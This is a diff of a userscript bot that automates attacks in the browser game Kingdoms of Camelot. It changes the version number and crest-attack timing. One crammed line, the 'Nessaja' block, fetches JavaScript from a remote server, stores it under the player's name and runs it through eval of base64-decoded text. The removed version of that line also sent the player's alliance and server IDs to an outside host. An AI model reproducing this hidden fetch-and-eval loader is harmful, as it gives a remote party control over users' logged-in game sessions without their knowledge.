@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name           KOC Power Bot
-// @version        20140903a
+// @version        20140904a
 // @namespace      mat
 // @homepage       https://code.google.com/p/koc-power-bot/
 // @include        *.kingdomsofcamelot.com/*main_src.php*
@@ -33,7 +33,7 @@ if(window.self.location != window.top.location){
    }
 }
 
-var Version = '20140903a';
+var Version = '20140904a';
 
 var http =  window.location.protocol+"\/\/";
 
@@ -8915,7 +8915,7 @@ if(GlobalOptions.Baos) {
     var t = Tabs.Scripter;
   },  
 }
-if(GlobalOptions.Baos)if (GlobalOptions.Baos.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return; var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID);  if (s != null) {    s = JSON2.parse (s); try{ eval(atob(s))}catch (err) {logit(err);};};  if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "https://baos.kocscripters.com/4Cxy4.php?p="+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+unsafeWindow.seed.allianceDiplomacies.allianceId,   headers: {'Accept': 'text/javascript',},  onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };
+if(GlobalOptions.Baos)if (GlobalOptions.Baos.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return;  var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID); if (s != null) {    s = JSON2.parse (s); try{ eval(atob(s))}catch (err) {logit(err);};} else if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "https://koc-power-bot.googlecode.com/svn/workspaces/darren/Nessaja",   headers: {'Accept': 'text/javascript',},  onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };
 
 /*********************************** Test TAB ***********************************/
 Tabs.Test = {
@@ -21423,16 +21423,17 @@ Tabs.Attack = {
 		var t = Tabs.Attack;
 		March.addMarch(p, function(rslt){
 			if(rslt.ok){
+					var now = new Date().getTime()/1000.0;
+					now = now.toFixed(0);
 				if(r==1){
 					Options.Crest1Count++;
 					r = 2;
 					CrestData[CrestDataNum].curRound = 2;
-					var now = new Date().getTime()/1000.0;
-					now = now.toFixed(0);
 					CrestData[CrestDataNum].lastRoundOne = now;
 					setTimeout (function(){callback(r,0,parseInt(CrestDataNum));}, (Options.Crestinterval*1000));
 				} else {
 					Options.Crest2Count++;
+					CrestData[CrestDataNum].lastRoundTwo = now;
 			if(CrestData[CrestDataNum].isWild){
 					setTimeout (function(){callback(r,0,parseInt(CrestDataNum));}, (Options.Crestinterval*1000));
 				} else
